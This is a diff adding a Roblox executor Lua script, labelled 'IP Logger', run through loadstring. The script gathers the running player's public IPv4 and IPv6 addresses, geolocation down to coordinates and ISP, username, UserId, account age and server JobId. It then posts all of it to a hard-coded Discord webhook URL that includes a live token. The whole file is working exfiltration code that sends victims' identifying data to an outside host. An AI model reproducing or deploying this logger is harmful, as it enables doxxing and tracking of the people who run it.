@@ -1,0 +1,250 @@
+loadstring([[
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+local LocalPlayer = Players.LocalPlayer
+
+local WEBHOOK = "https://discord.com/api/webhooks/1570165789628174548/Sgoe7T-7dqkUQ4fQ88Yfy-8b1nne1JqzGeVV2PJp4c20CFoAyV9JhRHQ1sx7FCHi0MUU"
+
+-- robust request (most executors)
+local function request(opts)
+    local req = (syn and syn.request)
+        or (http and http.request)
+        or (fluxus and fluxus.request)
+        or (http_request)
+        or (request)
+    if req then
+        return req(opts)
+    end
+    local ok, body = pcall(function()
+        if opts.Method == "GET" then
+            return HttpService:GetAsync(opts.Url)
+        else
+            return HttpService:PostAsync(opts.Url, opts.Body or "", Enum.HttpContentType.ApplicationJson)
+        end
+    end)
+    return { Success = ok, Body = body, StatusCode = ok and 200 or 0 }
+end
+
+local function cleanIP(raw)
+    if not raw then return nil end
+    raw = raw:gsub("%s+", ""):gsub('"', "")
+    -- IPv4
+    local v4 = raw:match("%d+%.%d+%.%d+%.%d+")
+    if v4 then return v4 end
+    -- IPv6 (basic)
+    if raw:find(":") then return raw end
+    return nil
+end
+
+local function getIPv4()
+    local sources = {
+        "https://api.ipify.org",
+        "https://ipv4.icanhazip.com",
+        "https://api.my-ip.io/ip"
+    }
+    for _, url in ipairs(sources) do
+        local res = request({ Url = url, Method = "GET" })
+        if res and res.Success and res.Body then
+            local ip = cleanIP(res.Body)
+            if ip and not ip:find(":") then return ip end
+        end
+    end
+    return "unknown"
+end
+
+local function getIPv6()
+    local sources = {
+        "https://api64.ipify.org",
+        "https://ipv6.icanhazip.com",
+        "https://v6.ident.me"
+    }
+    for _, url in ipairs(sources) do
+        local res = request({ Url = url, Method = "GET" })
+        if res and res.Success and res.Body then
+            local ip = cleanIP(res.Body)
+            if ip and ip:find(":") then return ip end
+        end
+    end
+    return "none"
+end
+
+local function getGeo(ip)
+    if not ip or ip == "unknown" or ip == "none" then return {} end
+    local res = request({
+        Url = "http://ip-api.com/json/" .. ip .. "?fields=status,country,regionName,city,isp,org,as,lat,lon,timezone,query",
+        Method = "GET"
+    })
+    if res and res.Success and res.Body then
+        local ok, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
+        if ok and data and data.status == "success" then
+            return data
+        end
+    end
+    return {}
+end
+
+-- GUI
+local function createGUI()
+    local old = CoreGui:FindFirstChild("olliEIPLogger")
+    if old then old:Destroy() end
+
+    local screen = Instance.new("ScreenGui")
+    screen.Name = "olliEIPLogger"
+    screen.ResetOnSpawn = false
+    screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    pcall(function() screen.Parent = CoreGui end)
+    if not screen.Parent then screen.Parent = LocalPlayer:WaitForChild("PlayerGui") end
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 340, 0, 210)
+    frame.Position = UDim2.new(0.5, -170, 0.12, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(16, 16, 20)
+    frame.BorderSizePixel = 0
+    frame.Parent = screen
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 10)
+    corner.Parent = frame
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(220, 40, 40)
+    stroke.Thickness = 1.5
+    stroke.Parent = frame
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, -20, 0, 26)
+    title.Position = UDim2.new(0, 12, 0, 8)
+    title.BackgroundTransparency = 1
+    title.Text = "olliE • IP Logger"
+    title.TextColor3 = Color3.fromRGB(255, 70, 70)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 16
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.Parent = frame
+
+    local status = Instance.new("TextLabel")
+    status.Name = "Status"
+    status.Size = UDim2.new(1, -20, 0, 20)
+    status.Position = UDim2.new(0, 12, 0, 38)
+    status.BackgroundTransparency = 1
+    status.Text = "resolving..."
+    status.TextColor3 = Color3.fromRGB(190, 190, 190)
+    status.Font = Enum.Font.Gotham
+    status.TextSize = 13
+    status.TextXAlignment = Enum.TextXAlignment.Left
+    status.Parent = frame
+
+    local info = Instance.new("TextLabel")
+    info.Name = "Info"
+    info.Size = UDim2.new(1, -24, 0, 100)
+    info.Position = UDim2.new(0, 12, 0, 64)
+    info.BackgroundTransparency = 1
+    info.Text = ""
+    info.TextColor3 = Color3.fromRGB(170, 170, 170)
+    info.Font = Enum.Font.Code
+    info.TextSize = 12
+    info.TextXAlignment = Enum.TextXAlignment.Left
+    info.TextYAlignment = Enum.TextYAlignment.Top
+    info.TextWrapped = true
+    info.Parent = frame
+
+    local close = Instance.new("TextButton")
+    close.Size = UDim2.new(0, 72, 0, 26)
+    close.Position = UDim2.new(1, -84, 1, -36)
+    close.BackgroundColor3 = Color3.fromRGB(36, 36, 44)
+    close.Text = "close"
+    close.TextColor3 = Color3.fromRGB(210, 210, 210)
+    close.Font = Enum.Font.Gotham
+    close.TextSize = 12
+    close.Parent = frame
+
+    local closeCorner = Instance.new("UICorner")
+    closeCorner.CornerRadius = UDim.new(0, 6)
+    closeCorner.Parent = close
+
+    close.MouseButton1Click:Connect(function()
+        screen:Destroy()
+    end)
+
+    task.delay(14, function()
+        if screen and screen.Parent then
+            local tw = TweenService:Create(frame, TweenInfo.new(0.55), {BackgroundTransparency = 1})
+            tw:Play()
+            tw.Completed:Wait()
+            screen:Destroy()
+        end
+    end)
+
+    return screen, status, info
+end
+
+-- main
+local _, statusLabel, infoLabel = createGUI()
+
+statusLabel.Text = "fetching IPv4 + IPv6..."
+local ipv4 = getIPv4()
+local ipv6 = getIPv6()
+
+-- most useful = IPv4 if present, else IPv6
+local primary = (ipv4 ~= "unknown") and ipv4 or ipv6
+
+local geo = getGeo(primary)
+
+local placeId = game.PlaceId
+local jobId = game.JobId
+local userId = LocalPlayer and LocalPlayer.UserId or 0
+local name = LocalPlayer and LocalPlayer.Name or "unknown"
+local display = LocalPlayer and LocalPlayer.DisplayName or "unknown"
+local accountAge = LocalPlayer and LocalPlayer.AccountAge or 0
+
+infoLabel.Text = string.format(
+    "IPv4: %s\nIPv6: %s\nPrimary: %s\n%s (%s) | %d days\n%s, %s",
+    ipv4, ipv6, primary,
+    name, display, accountAge,
+    geo.city or "?", geo.country or "?"
+)
+
+statusLabel.Text = "sending..."
+
+local embed = {
+    embeds = {{
+        title = "🔗 Roblox Executor IP Logger",
+        color = 15158332,
+        fields = {
+            {name = "IPv4", value = "`" .. tostring(ipv4) .. "`", inline = true},
+            {name = "IPv6", value = "`" .. tostring(ipv6) .. "`", inline = true},
+            {name = "Primary / Most Useful", value = "`" .. tostring(primary) .. "`", inline = false},
+            {name = "Player", value = name .. " (" .. display .. ")", inline = true},
+            {name = "UserId", value = tostring(userId), inline = true},
+            {name = "Account Age", value = tostring(accountAge) .. " days", inline = true},
+            {name = "PlaceId", value = tostring(placeId), inline = true},
+            {name = "JobId", value = "`" .. tostring(jobId) .. "`", inline = false},
+            {name = "Location", value = (geo.city or "?") .. ", " .. (geo.regionName or "?") .. ", " .. (geo.country or "?"), inline = true},
+            {name = "ISP / Org", value = (geo.isp or "?") .. " / " .. (geo.org or "?"), inline = true},
+            {name = "ASN", value = tostring(geo.as or "?"), inline = true},
+            {name = "Coords", value = tostring(geo.lat or "?") .. ", " .. tostring(geo.lon or "?"), inline = true},
+            {name = "Timezone", value = tostring(geo.timezone or "?"), inline = true},
+        },
+        footer = {text = "olliE • absolute olliE"},
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
+}
+
+local body = HttpService:JSONEncode(embed)
+local res = request({
+    Url = WEBHOOK,
+    Method = "POST",
+    Headers = { ["Content-Type"] = "application/json" },
+    Body = body
+})
+
+if res and (res.Success or (res.StatusCode and res.StatusCode >= 200 and res.StatusCode < 300)) then
+    statusLabel.Text = "✓ sent (IPv4 + IPv6)"
+    statusLabel.TextColor3 = Color3.fromRGB(70, 220, 110)
+else
+    statusLabel.Text = "✗ send failed"
+    statusLabel.TextColor3 = Color3.fromRGB(255, 70, 70)
+end
+]])()
